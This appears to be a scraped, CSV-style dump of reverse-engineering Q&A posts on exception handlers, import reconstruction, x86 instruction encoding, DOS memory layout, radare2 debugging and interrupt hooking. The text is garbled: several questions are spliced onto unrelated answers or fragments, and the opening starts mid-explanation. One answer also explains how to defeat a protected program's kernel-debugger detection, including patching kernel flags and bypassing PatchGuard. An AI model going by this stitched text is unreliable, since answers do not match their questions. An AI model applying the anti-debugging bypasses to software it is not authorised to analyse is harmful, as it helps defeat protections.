<p>First, it executes all exception handlers, starting with the first Vectored Exception Handler to the last, and then going through all Structured Exception Handlers unfolding them through the stack. The first exception to return <code>EXCEPTION_CONTINUE_EXECUTION</code> will stop the entire exception handlers execution process.</p>

<p>Like VEHs, when VCHs are called, they are called one by one until one of them returns <code>EXCEPTION_CONTINUE_EXECUTION</code> (just as when VEHs are called), which signals <code>RtlpCallVectoredHandlers</code> to <code>break</code> the Vectored Handlers calling loop. This is interesting because it means installing a Vectored Continue Handler as first lets you hide exceptions from subsequent VCHs.</p>

<p>Vectored Continue Handlers are called under the following circumstances:</p>

<ol>
<li>If an exception handler (either VEH or SEH) was called and returned <code>EXCEPTION_CONTINUE_EXECUTION</code></li>
<li>If for some reason SEH validation failed (See SafeSEH and related mechanisms), VCHs will also be called, but the execution will not continue afterwards.
This can be seen in the many flows that lead to the second <code>RtlpCallVectoredHandlers</code> call without setting <code>bl</code> to <code>1</code> and leaving it equal to zero before moving it to <code>al</code> and returning <code>false</code>. The calling function, <code>KiUserExceptionDispatcher</code> will then call <code>ZwRaiseException</code> if the value returned by <code>KiUserExceptionDispatcher</code> is <code>false</code>.

"What is import reconstruction and why is it necessary?","560","","<p>When reading about unpacking, I sometimes see an ""import reconstruction"" step. What is this and why is it necessary?</p>
","<p>In a typical, non-packed Windows PE executable, the header contains metadata that describes to the operating system which symbols from other libraries that the executable depends upon.  The operating system's loader is responsible for loading those libraries into memory (if they are not already loaded), and for placing the addresses of those imported symbols into structures (whose locations are also specified by the metadata) within the executable's memory image.  Packers, on the other hand, often destroy this metadata, and instead perform the resolution stage (which would normally be performed by the loader) itself.  The goal of unpacking is to remove the protections from the binary, including the missing import information.  So the analyst (or unpacking tool) must determine the collection of imports that the packer loads for the executable, and re-create metadata within the unpacked executable's image that will cause the operating system to properly load the imports as usual.  </p>

<p>Typically in these situations, the analyst will determine where within the executable's memory image the import information resides.  In particular, the analyst will usually locate the <code>IMAGE_THUNK_DATA</code> arrays, which are <code>NULL</code>-terminated arrays that contain the addresses of imported symbols.  Then, the analyst will run a tool that basically performs the inverse of <code>GetProcAddress</code>:  given one of these pointers to imported symbols, it will determine in which DLL the pointer resides, and which specific exported entry is referred to by the pointer.  So for example, we might resolve <code>0x76AE3F3C</code> to <code>Kernel32!CreateFileW</code>.  Now we use this textual information to recreate <code>IMAGE_IMPORT_DESCRIPTOR</code> structures describing each imported DLL, use the original addresses of the <code>IMAGE_THUNK_DATA</code> arrays, store the names of the DLLs and imported symbols somewhere in the binary (perhaps in a new section), and point the <code>IMAGE_THUNK_DATA</code> entries to those new names.</p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/ImpREC%E2%80%8E"">ImpRec</a> is a popular tool that automates most or all of this process, depending upon the packer.  What I just described is reflective of reality in about 95% of cases.  More serious protections such as video game copy protections and tricky custom malware use further tricks that stymie the reconstruction process.</p>

<p>Now, the question. I have to modify multiple locations and manually adjusting values is killing me. Can I do this with <a href=""http://code.google.com/p/pefile"" rel=""nofollow"">code.google.com/p/pefile</a> from python, which I am assuming will help in adjusting?

when found uses the address where it was found to replace the two bytes 68XX with EB FE 
it does this for all the bytes that are found in a given range in addition to this it also prints out the assembly prior to modification and after modification</p>

<pre><code># 68??  pattern search command in windbg

</code></pre>

<p>The malware uses a register index starting from 0 (EAX) till 7 (EDI)</p>

<p>The number is get SHLed first with the number 3 then it is ORed with 5 to get the right register opcode. So my question is how the author came to the conclusion of that?</p>

<p>I would say that SHL REG,3 equals REG*8 that is the number of max registers? but why do we need to OR it with 05? is it because the starting opcode of this instruction is 05?</p>

<p>Does anybody have a better explanation for this? or any hint words for a better comprehend?</p>
","<p>To better understand this, you need to study instruction encoding formats i.e. x86 for this question.</p>

<p>An x86 instruction looks like this</p>

<pre><code>+----------------------+--------+--------+-----+--------------+-----------+
| Instruction prefixes | Opcode | ModR/M | SIB | Displacement | Immediate |
+----------------------+--------+--------+-----+--------------+-----------+
|          0-4         |   1-3  |   0-1  | 0-1 |      0-4     |    0-4    |
+----------------------+--------+--------+-----+--------------+-----------+
</code></pre>

<p>The numbers on the second row indicates the length in bytes of the corresponding part.</p>

<p>For the instruction,</p>

<pre><code>010D 00000000   ADD DWORD PTR DS:[0],ECX
</code></pre>

<p>there is no instruction prefix.
The opcode for <code>ADD</code> is <code>01</code> (<a href=""http://x86.renejeschke.de/html/file_module_x86_id_5.html"" rel=""nofollow noreferrer"">Check here</a>)</p>

<p>The second byte of the instruction i.e <code>ModR/M</code>is <code>0D</code>.
The <code>ModR/M</code> byte provides addressing information about the instruction. It specifies whether an operand is in a register or in memory; if it is in memory, then fields within the byte specify the addressing mode to be used.</p>

<p>The <code>ModR/M</code> byte can be broken down into</p>

<pre><code>+-----+------------+-----+
| Mod | Reg/Opcode | R/M |
+-----+------------+-----+
|  2  |      3     |  3  |
+-----+------------+-----+
</code></pre>

<p>Here the numbers on the second row indicates the length in bits of the corresponding parts.</p>

<p>The <code>Mod</code> field (2 bits) combines with the <code>R/M</code> field (3 bits) to form 32 possible values 8 registers and 24 addressing modes.</p>

<p>The <code>Reg/Opcode</code> field (3 bits) specifies either a register number or three more bits of opcode information; the <code>r/m</code> field (3 bits) can specify a register as the location of an operand, or it can form part of the addressing-mode encoding in combination with the <code>Mod</code> field.</p>

<p>Now, convert the <code>ModR/M</code> i.e <code>0D</code> to binary. You would get.</p>

<pre><code>+-----+------------+-----+
| Mod | Reg/Opcode | R/M |
+-----+------------+-----+
|  00 |     001    | 101 |
+-----+------------+-----+
</code></pre>

<p>The <code>Mod</code> and <code>R/M</code> fields are <code>00</code> and <code>101</code> respectively. This indicates displacement only addressing mode. See the table below.</p>

<p><a href=""https://i.stack.imgur.com/mGqsS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/mGqsS.png"" alt=""enter image description here""></a> </p>

<p><strong>For all the instructions this mode of addressing is used, hence the reason for  <code>OR</code>ing with 5 (in binary 101) to set that particular bit pattern.</strong></p>

<p>Coming to the <code>Reg/Opcode</code> field, this indicates a register. 
<br><code>001</code> is the register index for <code>ECX</code>. </p>

<p>For the first instruction i.e
<br><code>0105 00000000   ADD DWORD PTR DS:[0],EAX</code> 
<br>this field is <code>000</code> standing for <code>EAX</code>. You can check by converting <code>05</code> to binary.</p>

<p>See more in the table below taken from <a href=""http://www.c-jump.com/CIS77/CPU/x86/X77_0060_mod_reg_r_m_byte.htm"" rel=""nofollow noreferrer"">here</a>.</p>

<p><a href=""https://i.stack.imgur.com/Ljow1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Ljow1.png"" alt=""enter image description here""></a></p>

<p><strong>So basically the register value was <code>SHL</code>ed with 3 to move it to the correct position. The Reg/Opcode field is 3 bits from the right.</strong></p>

<p>Finally the last 4 bytes are <code>00000000</code>. This represents the displacement which is zero in this example.</p>

"Where can I find benign samples with a high potential to false positive?","556","","<p>In the pursue and development of malware detection algorithms, often a big sample set of both malicious and benign samples is required.

The programs---a mix of Linux and Windows binaries---are all benign (you'll have to take my word for this :-), but use a variety of techniques commonly used by malware.  These samples formed the basis for the results reported in the following papers:</p>

</ul>

<p>We used to have a link to these samples on the project web page, but Google decided that we were distributing malware and put a big red warning next to their link (talk about false positives!), so we ended up removing the link.

"Any correlation between DOS Program Segment Prefix and the base address of loaded executable?","551","","<p>I'm using IDA to disassemble <a href=""http://www.myabandonware.com/game/test-drive-iii-the-passion-119"" rel=""nofollow"">Test Drive III</a>. It's a 1990 DOS game. The *.EXE has MZ format.</p>

<p>The game uses a number of anti-reversing features such as copying its code to segment <code>(PSPseg+2be7)</code> where <code>PSPseg</code> is the initial value of <code>ES</code> (i.e. the segment where PSP resides). As far as I know, <a href=""http://en.wikipedia.org/wiki/COM_file"" rel=""nofollow"">COM executables</a> are always loaded right after the end of <a href=""http://en.wikipedia.org/wiki/Program_Segment_Prefix"" rel=""nofollow""><code>Program Segment Prefix (PSP)</code></a>, so that both PSP and exe fit into one segment. What about MZ executables? Is there any fixed place where application's PSP is located relatively to the application itself?</p>

<p>In other words, is the <code>base-PSPseg</code> offset always the same? On my <a href=""http://www.dosbox.com/"" rel=""nofollow"">DOSBox</a> at the start of the program execution <code>CS</code> is always <code>0x22CF</code>, <code>ES=DS=0x01FE</code>, <code>CS0</code> in the MZ header is <code>0x20C1</code>, yielding <code>base-PSPseg</code> offset <code>0x0010</code> (16 segments, 256 bytes - exactly the size of PSP).</p>

<p>If this offset is not fixed and both PSP and the application are just loaded randomly in whatever memory location is big enough, then is there at least any guarantees about their addresses? Like that PSP address is always lower than the app's base address?</p>
","<p>DOS didn't have a concept of more than one application being able to run at the same time, with each of those applications able to allocate memory. Programs that stayed resident after termination weren't able to allocate more memory while another program was running. So, there was no fragmentation in memory, and no ""memory location that was big enough"".</p>

<p>The memory from 0x00000 was occupied by the interrupt vector table and various bios variables, DOS loaded behind them. The end of the memory block that was used by DOS depended on lots of factors, but whenever a program got loaded, the PSP was created at the lowest possible location, and the program loaded directly behind that. So, yes, you can rely on your program using the memory behind the PSP, and you can rely on the difference between your segment registers and the PSP being constant as well.</p>

<p>The PSP segment itself was unpredictable to programmers - stuff like the ansi.sys console driver, foreign keyboard drivers, the Cdrom drivers, and various stay-resident programs (anyone remember sidekick?) could increase the size of the ""dos block"" causing the PSP address of loaded programs to increase (and available memory to decrease). But as long as you don't change the configuration of your DOSBOX, you should be able to rely on the PSP - and your segment registers - being the same for each run of the program.</p>

"Is it possible to (heuristic) identify the begin addr of main function in a stripped ELF?","551","","<p>So basically I am working on some tripped <em>dynamic linked</em> ELF binaries (32 bit Linux x86), using <code>objdump</code> to disassemble them, modifying and trying to reassemble them.</p>

<p>I developed a ndk library that forks from main process and <code>ptrace_attach</code> the parent process(being the main process) inside the <code>JNI_OnLoad()</code> function. After that periodically checks the <code>/proc/&lt;pid&gt;/task</code> folder to attach newly created threads. </p>

<p>The problem is, 
this works well in normal apps but when I try to run this inside an app made with unity, the main process stops and screen becomes black or white not responding. But if you delay attaching a few seconds just enough to see the animation working on the screen, attaching works fine.</p>

<p>Code is roughly something like this:</p>

<pre><code>if(!fork())
{
     parentPid = getppid();

     // attach parent process
     if(ptrace(PTRACE_ATTACH,parentPid,0,0)&lt;0)
          exit(-1);
     ptrace(PTRACE_SETOPTIONS, parentPid, 0, PTRACE_O_TRACEEXEC| PTRACE_O_TRACEVFORKDONE|PTRACE_O_TRACESYSGOOD |PTRACE_O_TRACEFORK |PTRACE_O_TRACEVFORK |PTRACE_O_TRACECLONE );

     while(true)
     {
          // get signal from processes
          stoppedPid = waitpid(-1,&amp;stat_loc, 0);

          ...

          // check if stoppedPid need to be attached
          // if so, attach
          ptrace(PTRACE_ATTACH,stoppedPid,0,0);

          ...

          // else, just continue the stopped process
          ptrace(PTRACE_CONT,stoppedPid,0,0);
     }
 }
</code></pre>

<p>Maybe I should adjust the <code>ptrace_setoptions</code> ?</p>

<p>Thanks in advance :)</p>
","<p>Well somethings I found out - </p>

<p>When I <code>ptrace_attach</code> the main process of the target app and wait for signals, 
I get SIGSEGV signal while app loads and just hangs there(because forked process cannot handle SIGSEGV). In the java code, it seems SIGSEGV occurs while calling View related functions. </p>

<p>I guess UnityPlayer or Android app loader handles SIGSEGV smoothly while app loading time. Therefore, if you get a SIGSEGV, simply detaching it and attaching again does not hang the app. </p>

"Anti-kernelmode functions (specifically zwquerysysteminformation)","542","","<p>I'm working on a program that has lots of checks, and I've decided to start by disabling their anti-kernel mode, as it'd surely be more easy to isolate than normal anti-debugging. After poking around a little, I found that <code>ntdll.zwquerysysteminformation</code> runs in a loop in the main thread called by several <code>.vmp</code> addresses. Since I <strong>can't make memory changes, even in DLLs</strong> (or debug it normally), I was thinking about setting up kernel mode breakpoints until I have a bit more to go off of, but to do that, I'd need the offset from the base structure containing the byte. Microsoft doesn't seem to provide this, so would anyone happen to know? Or maybe have general pointers on getting past kernel mode detection in obfuscated targets? I know this is pretty broad, but I'm pretty sure they'd only have used the most basic of methods.</p>
","<p>I think the check you're talking about (<code>NtQuerySystemInformation</code> with <code>SystemKernelDebuggerInformation</code>) simply checks <code>KdDebuggerEnabled</code> and <code>KdDebuggerNotPresent</code> under the hood (both are single bytes exported from <code>ntoskrnl.exe</code>). You could simply patch those two to get past that particular check. Alternatively, you could go for hooking NtQuerySystemInformation either in usermode (you've mentioned that you can't make memory changes, but that's usually not true - if a memory change at some location is detected, then make the change somewhere else) or in kernelmode (requiring a PatchGuard bypass on 64-bit systems).</p>

<p>However, your kernel debugger might still be detected by its window/driver name.</p>

"Debugging with radare2 using two terminals","542","","<p>I have been trying to figure this out for quite some time now, and would really need some help. Firstly, some intro:</p>

<p>I am running the newest version of radare2 from Github on a 64bit Ubuntu 16.04 and have the following sample program <code>r2_test.cpp</code>:</p>

<pre><code>#include &lt;cstdio&gt;

int main(int argc, char* argv[])
{
    int num;

    while (1)
    {
        printf(""Enter a number: "");
        scanf(""%d"", &amp;num);
        printf(""You entered: %d\n"", num);
    }

    return 0;
}
</code></pre>

<p>What I am trying to achieve is to debug this program using radare2 and two terminals in a way that I run radare2 in terminal window <code>T1</code> and have the programs input/output in terminal window <code>T2</code>. After some research I figured that this should probably be done with the help of <code>rarun2</code> tool. </p>

<p>So, for my first try I read the <a href=""https://github.com/radare/radare2/blob/master/man/rarun2.1#L139"" rel=""noreferrer"">man page</a> for rarun2, specifically the part with redirecting IO to another terminal and after identifying the <code>T2</code> terminal as <code>/dev/pts/17</code> I created the following <code>test.rr2</code> file:</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/17
</code></pre>

<p>In <code>T2</code> terminal I've then run <code>sleep 999999</code> and in terminal <code>T1</code> I run <code>r2 -R test.rr2 -d a.out</code> and when executing the command <code>dc</code> inside radare2, the programs input/output is in terminal <code>T1</code> which is not what I wanted. I've also tried variations like making <code>test.rr2</code> equal </p>

<pre><code>#!/usr/bin/rarun2
stdin=/dev/pts/17
stdout=/dev/pts/17
</code></pre>

<p>or</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/17
stdin=/dev/pts/17
stdout=/dev/pts/17
</code></pre>

<p>but the result was always the same.</p>

<p>For my second try, after some research and reading, I tried running the radare2 in the following way: <code>r2 -d rarun2 program=a.out stdio=/dev/pts/17</code>. With this I've achieved redirecting the IO to terminal <code>T2</code>, but the process which gets debugged inside radare2 is the rarun2 tool and since my knowledge of Linux and reverse engineering on it is not that good, I don't really know how to proceed to debugging the <code>a.out</code> process.</p>

<p>So, to summarize, I would really appreciate if someone could share here if this kind of debugging can be done with radare2 and, if it can, how to achieve it? I've also tried it with using <code>nc</code>, but I haven't made any progress to this topic with it.</p>
","<p>It is actually very simple and works for me just fine as you can see in the following gif:</p>

<p><img src=""https://i.imgur.com/LqrnYRP.gif"" alt=""Direct link""></p>

<hr>

<p>First you need to figure out the <code>tty</code> of the terminal you want to redirect the <code>STDIO</code> to (a.k.a Terminal 2, <em>T2</em>).
You can do this  by simply execute:</p>

<pre><code>$ tty
/dev/pts/2
</code></pre>

<p>This <code>tty</code> will soon be used on the <code>rarun2</code> profile file.
Meantime, let's put <em>T2</em> to sleep by using <code>sleep 999999</code>.  </p>

<p>Moving to <em>Terminal 1</em>, let's create a simple <code>rarun2</code> profile with the following content:</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/2
</code></pre>

<p>We configured <code>stdio</code> to transfer the <em>standard input and output</em> to <em>T2</em>.
Now let's execute our program with the profile we've just created:</p>

<pre><code>$ r2 -e dbg.profile=profile.rr2 -d a.out  
Process with PID 14074 started...
= attach 14074 14074
bin.baddr 0x00400000
Using 0x400000
Assuming filepath /tmp/re/a.out
asm.bits 64
 -- Mind that the 'g' in radare is silent
[0x7f9654e0fd80]&gt;
</code></pre>

<p>(<em>The same can be done using:</em> <code>r2 -R profile.rr2 -d a.out</code>)<br>
The program successfully loaded in debug mode. Now just for the example, let's put a <em>breakpoint</em> on the second call to <code>printf</code> and start the program using <code>dc</code>. In the <em>gif</em> I was not creating a breakpoint.</p>

<pre><code>[0x7f9654e0fd80]&gt; db 0x00400580
[0x7f9654e0fd80]&gt; dc
Selecting and continuing: 14074
</code></pre>

<p>Now <em>T2</em> gives us the output and asks for our input:</p>

<pre><code>Enter a number:
</code></pre>

<p>After we send it a digit our breakpoint on <em>T1</em> hit:</p>

<pre><code>hit breakpoint at: 400580
[0x00400580]&gt;
</code></pre>

<p>We can now continue the execution using <code>dc</code>, the loop would continue forever and the Standard Input and Output will be in T2.</p>

"What is the benefit or reason of using a static disassembler over a dynamic disassembler in terms of malware analysis?","542","","<p>I know that </p>

<blockquote>
  <p>Dynamic program analysis is the analysis of computer software that
  is performed by executing programs on a real or virtual processor.</p>
</blockquote>

<p>while</p>

<blockquote>
  <p>Static program analysis is the analysis of computer software that is
  performed without actually executing programs</p>
</blockquote>

<p>But what i don't understand is that why would someone use a static disassembler like ida pro over a dynamic disassembler or debugger like ollydbg and vice versa.</p>

<p>P.S This is not a duplicate of 
<a href=""https://reverseengineering.stackexchange.com/questions/3473/what-is-the-difference-between-static-disassembly-and-dynamic-disassembly"">What is the difference between static disassembly and dynamic disassembly?</a></p>

<p>Because this is not asking for the difference but it is asking for the reason and benefits why someone would choose static disassembler over a dynamic disassembler and vice versa in terms of malware analysis. </p>
","<p>In most cases, you won't confine yourself to one of them, instead, you'll use both.</p>

<p>Dynamic analysis means running the software. You don't want to do this with a piece of software that you suspect of being malware, except in a controlled environment. </p>

<p>Also, before running the software, you want to know a bit about it. Is the executable packed in some way? Does it use anti-debugging techniques? Does the software contain any pieces of some well-known / open source library? There are lots of tools out there that answer some of these questions - Ida pro is only one of them.</p>

<p>To further improve your understanding of the software, you want a tool that helps you find dependencies between its parts. Which parts of the binary are actually code, and which are data? If the software contains strings, or other data, that looks interesting, where are those referenced? Which function is called where? This is where the cross-referencing of IDA comes in handy.</p>

<p>On the other hand, in many cases, you don't really need to understand every single instruction of a subroutine to know what it does. You might want to know which files and which registry keys get read and written by your software. Or, you might want to know if it accesses the internet, and which sites it connects to. Running the software with stuff like <code>procmon</code> or <code>wireshark</code> enabled is the fastest way to find out - i'd consider that dynamic analysis as well, even though <code>procmon</code> and <code>wireshark</code> aren't debuggers. Or, while analyzing your software, you come across a function that contains lots of bit operations - this might be some kind of encryption or hashing. Fire up a debugger, set breakpoints on the function, and check its parameters and return values. This can confirm your assumption much faster than trying to understand the function.</p>

<p>Now, you've confirmed the function really decrypts something, and you want to know how it works. You'll probably want to annotate individual opcodes with comments like 'at this point, <code>eax</code> contains all bytes of the input string, xor'red with each other' or 'this doesn't do anything and seems to be nothing but obfuscation'. Tools like IDA allow you to do exactly this.</p>

<p>So the answer is: unless you have a very trivial piece of software, you won't choose one over the other. Analyzing the software consists of many tasks; for some of them, static analysis is easier, for others, dynamic analysis. Any self respecting reverse engineer will have lots of tools at his disposal and pick the right one depending on the task at hand, and quite often, will write his own tool as well to tackle some problems he has with the specific software he's working on right now.</p>

<p>Note that i've never always used the term <code>software</code> instead of <code>malware</code>, as this relates to any kind of reverse engineering, not just malware analysis.</p>

"Interrupt interception","541","","<p>I'm currently reading <a href=""http://vxheaven.org/vx.php?fid=17"" rel=""nofollow"">40hex magazine</a> regarding virus writing in the early 90's. They talk a lot there about <code>interrupt intercepting</code> Which is something security guys from anti viruses company will try to do, and should be prevented (from virus writing point of view)</p>

<p>What is exactly <code>interrupt intercepting ?</code></p>
","<p>By intercepting or hooking interrupts in DOS you can make the system behave differently whenever an interrupt is triggered. And there are many interrupts used in x86 architecture, some are triggered by hardware (such as clock, keyboard, divide overflow/divide by zero), some are BIOS services that can be called from software and some are OS services or other services that can also be called from software. All interrupts are equally easy to hook. All you need is <code>cli</code>, replace the interrupt vector with your own one, <code>sti</code>, or use some BIOS or DOS service.</p>

<p>By hooking an interrupt you can first do your thing in your own interrupt handler and then forward the original parameters to the original interrupt handler, but you can also replace entire interrupts or specific services of chosen interrupts (without forwarding). TSRs (terminate &amp; stay resident) programs are all based on hooking interrupts (with or without interrupt forwarding). For example many DOS debuggers are TSRs, and probably many viruses too.</p>

<p>For example it's possible to write an interrupt handler for interrupt 0x13 that disables all hard drive formatting functions of BIOS interrupt 0x13, by first checking the parameters for <code>int 0x13</code>, and if the function (in <code>ah</code>) is 5, 6, 7, 0x1a ... then set the desired return values in registers and flags as you like , then <code>iret</code>, otherwise <code>jmp</code> to the original interrupt handler. You can write a TSR debugger that hooks the chosen interrupts and presents the debugger screen whenever a chosen interrupt is triggered. You can adjust the system timer interrupt frequency and then hook the timer interrupt to use it to play music eg. with AdLib or SoundBlaster. You can write a TSR keylogger, a TSR virus scanner or a TSR hard drive defragmenter. You can make the computer play ""Jingle Bells"" through PC speaker or sound card whenever the user presses Enter and it's December. The possibilities are limited only by the hardware available and the skill of the programmer.</p>

<p>The result I'm hoping for is extracted files that have been packed into the executable.</p>

<h2>Update</h2>

<p>I've used <code>FastScanner 3.0</code> against the application and I've found out that it was packed just as the previous one, using MoleBox Pro. Here's all the FastScanner gueses (same as in previous app).

<p>So everything seems to be just like it was, but the binary file is different and I can't unpack it in any way, when back in previous application it wasn't a problem at all. Molebox is long dead so I doubt it was packed by newer version. 
Also messing with ollydbg I've found out that the application have entry points on those two files that I've called before.</p>
","<p>It turns out that the newer version was packed just as the previous one, using same Molebox Pro.

"Hex representation of integer values in excess of FF (255)","538","","<p>I am learning some gdb and it is covering examining arrays. There is the following code, and I see it is 4 bytes, and how <code>a[1] = 2</code> in an array <code>int a[] = {1,2,3}</code></p>

<pre><code>(gdb) x/4xb a + 1
0x7fff5fbff570: 0x02  0x00  0x00  0x00
</code></pre>

<p>But what if a was greater than what could be shown by a single hex byte? Then how does it work for the second part? Sorry if this is unclear, I don't know how tow ord it exactly.</p>
","<p>I think you have two questions here.  The first part is how to convert from decimal to hexadecimal and back; the second part is how a multi-byte value is represented in memory.  Guntram Blohm's answer covers the first part in detail, and I'll try to muddle through an answer to the second here.</p>

<p>So, consider a multi-byte hexadecimal number...ABCD, where each letter represents a byte.  So for example in 0x03B87C43 A represents 0x03, B represents 0xB8, C represents 7C and D represent 0x43.  Finally, D is referred to as the low-order byte.  </p>

<p>Now, the various bytes can be arranged in different ways in memory; and there are two major forms that are currently in use today:</p>

<p><strong>little-endian</strong> form:</p>

<p>The low-order byte is placed at the lowest memory address, thus our example number would be
stored in memory thusly:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  D  |  C  |  B  |  A  |
+-----+-----+-----+-----+
</code></pre>

<p>Intel processors use this form of storing multi-byte numbers.</p>

<p><strong>big-endian</strong> form:</p>

<p>The low-order byte is placed at the highest memory address, thus our example number would be 
stored in memory thusly:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  A  |  B  |  C  |  D  |
+-----+-----+-----+-----+
</code></pre>

<p>Non-Intel SUN workstations use this form (IIRC they use a Motorola processor).</p>

<p>other forms.</p>

<p>just about any other arrangement can be used.  For example, PDP-11 used a system where 
a 32-bit value was stored in little-endian format, with the exception of each byte of the 16-bit half was swapped.  Thus our sample number would be stored in memory as:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  C  |  D  |  A  |  B  |
+-----+-----+-----+-----+
</code></pre>

<p>Hope this helps a bit.</p>

"How Do I get proficient at Reverse engineering?","537","","<p>Please bare with me as I explain this situation.</p>

<p>Maybe 10 days ago I took up the challenge of reverse engineering an Android app. Learning from scratch, I installed ADB, Apktool, Android Studio, Notepad++ with Smali highlighting etc. My approach has been to write test programs in Android studio that mirror the workings of the APK, and then decompile with Apktool to help me do Smali modifications. I've been successful in modifying the application to log all HTTP requests, headers, cookies, and post data to the android log.</p>

<p>My next challenge was to figure out how an important algorithm in the app works. This is what stumped me. I spent the last 3 or 4 days spending the majority of my day analysing Smali code making almost no progress. Apparently the algorithm is done (at least in part if not mostly) in a native library with the .so extension.</p>

<p><strong>One of the extremely frustrating things about Reverse engineering is how small the community is</strong>. There's very little resources on the web (At least compared to other things). I've probably bitten off more than I can chew. I always attempt difficult projects that are above my skill level. For this task I'm guessing I need to become very familiar with ARM and I'll have to use IDA Pro to analyse the .so file? To explain my knowledge level:</p>

<ul>
<li>I have very little experience using Ollydbg in Windows (I have slight
understanding of registers and CMP, JMP, ADD commands etc)</li>
<li>I have no
experience using IDA Pro. I'm quite new to reverse engineering, but I've had success with simple Smali modding because it's simple in
some situations.</li>
<li>I know basic Java (To be clear I'm not a complete beginner, variables, for loops, arrays, classes (to an extent) are second nature to me)</li>
<li>I know basic C++ if not more than
basic</li>
<li>I've done a lot of Vb.NET programming.</li>
<li>I feel quite knowledgeable in Python.</li>
</ul>

<p>So I'm experienced with programming but not really reverse engineering. How in over my head am I attempting to understand this complex native library (When I already know practically nothing about native libraries/JNI)? Could the professionals here please give me some specific examples of how I can get to the level where I am knowledgeable enough to complete my goal? I don't want to just give up because this is a difficult challenge. Please give me suggestions of how I can progress enough to complete my goal. I assume I'll need to learn IDA Pro and how ARM works.</p>

<p>Thanks</p>

<p>I know it feels like you've made ""no progress"", but I'd encourage you to not look at it that way. You spent 3 or 4 days figuring out which approaches <em>don't work</em>, which is in itself progress. And you also built up 3 or 4 days of reverse engineering experience, regardless of how fruitful the immediate outcome was.</p>

</blockquote>

<p>Given that you've determined that the Java code calls out to the .so library, it shouldn't be too difficult to find the native function in the .so library since the native function would be exported-by-name for JNI compatibility. This means that you don't in fact need to ""understand this complex native library"" in its entirety, but rather just the one native function in question (in addition to the functions that that function calls).</p>

<p>If the native code is not heavily obfuscated and if you have <a href=""https://www.hex-rays.com/products/decompiler/index.shtml"">Hex-Rays for ARM</a>, it should be relatively <a href=""https://www.hex-rays.com/products/decompiler/compare_arm0.shtml"">easy to understand</a> the target function. If, on the other hand, you don't have Hex-Rays, then you can use the <a href=""https://www.hex-rays.com/products/ida/support/download_demo.shtml"">evaluation version of IDA Pro</a> to disassemble the target function. You'd need to manually analyze the ARM instructions to determine what the function is doing. Although that can be tedious, ARM instructions and the architecture in general are <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.set.architecture/index.html"">very well-documented</a>. Approach it as you would when learning any new programming language.</p>

<p>Start analyzing the function from the very first instruction, and keep high-level notes on what each instruction is doing in the context of the function. Keep track of what values get stored in what registers and how memory is used. On first-pass, your goal is to determine <em>what</em> the function is doing (based on the instructions). Once you've extrapolated <em>what</em> the function is doing, your second-pass should focus on trying to understand <em>why</em> the function is doing what it's doing. After some time, things should begin to ""click"" in your mind, you'll get that ""aha!"" moment, and you'll understand how the target algorithm works.</p>

"Books on reversing with GDB?","535","","<p>i'm getting started with some reverse engineering lately , especially on linux and ELF format , but i'm struggling here.
For now i'm only using GDB to disassemble binaries , and even though i can read and understand the assembly code in general , i don't know ""where"" to look , or what register to check to find the Flag (i'm talking about CTFs here)
so what i'm asking for are books , or videos , something to get me used to GDB and give me the thinking methodology (if there's such a thing).

"Working with DOS .COM files","535","","<p>What can I do to reverse engineer a DOS .COM file? As far as debugging goes, I've looked DEBUG and DEBUGX from the creators of FreeDOS, as well as the default DEBUG command that comes with Windows. Sure, I can probably work with them and eventually figure out what I'm doing, but I feel like the process would end up being longer than necessary. Is there a better tool I can use?</p>

<p>If there are no ""better"" tools than DEBUG or DEBUGX, then what can I use to work with output from these two tools? My main goal is to create something that mimics the .COM program, but in a more manageable format (as far as code goes).</p>
","<p>I personally use <a href=""http://www.dosbox.com"">DosBox</a> debugger, which is quite complete, with a SoftICE-like interface.</p>

<p>Otherwise you can go for DOS debuggers like Turbo Debugger or CodeView.</p>

"Why IDA Pro generate define-lack code like this?","533","","<p>Basically I us IDA Pro 6.1 on Windows 32 bit, dealing with binaries from SPEC 2006.</p>

<p>I use IDA Pro to generate asm code from the binaries, and in the .data section, I see data define like this:</p>

<pre><code>GS_ExceptionRecord _EXCEPTION_RECORD  &lt;?&gt;
GS_ContextRecord _CONTEXT  &lt;?&gt;
lclcritsects    _RTL_CRITICAL_SECTION 0Eh dup(&lt;?&gt;)
 .....
DoubleFormat    FpFormatDescriptor &lt;400h, 0FFFFFC01h, 35h, 0Bh, 40h, 3FFh&gt;
FloatFormat     FpFormatDescriptor &lt;80h, 0FFFFFF81h, 18h, 8, 20h, 7Fh&gt;  
</code></pre>

<p>Basically I can not find the definition of <strong>_EXCEPTION_RECORD</strong> ,<strong>_CONTEXT</strong> ,<strong>_RTL_CRITICAL_SECTION</strong>, <strong>FpFormatDescriptor</strong> in the generated asm code.</p>

<p>And in the code, they will be used like:</p>

<pre><code>mov     edi, DoubleFormat.precision
mov     eax, DoubleFormat.min_exp
sub     ecx, DoubleFormat.precision

mov     edi, FloatFormat.precision

mov     edi, offset lclcritsects

mov     GS_ContextRecord._Eax, eax
mov     word ptr GS_ContextRecord.SegSs, ss
pop     GS_ContextRecord.EFlags
</code></pre>

<p>So basically my questions are:</p>

<ol>
<li><p>How can I find the definition of these stuff?</p></li>
<li><p>Basically I use <strong>File-->Produce File-->Create ASM File</strong> to generate asm code for analysis, then how can I dump these definitions from IDA Pro's Structures window into this asm code?</p></li>
</ol>

<p>And what's more, it seems that I can not find the definition in Structures window even if I expand them....</p>

<p><img src=""https://i.stack.imgur.com/gxynq.png"" alt=""enter image description here""></p>
","<p>As far as I know IDA doesn't dump structure layouts as part of generated assembly listings. It does however know about all the structures that you mention. Go to the structures window, press ""<code>Insert</code>"" and name the new structure <code>CONTEXT</code>, <code>EXCEPTION_RECORD</code> or <code>RTL_CRITICAL_SECTION</code> and IDA will show the layout in the structures window.</p>

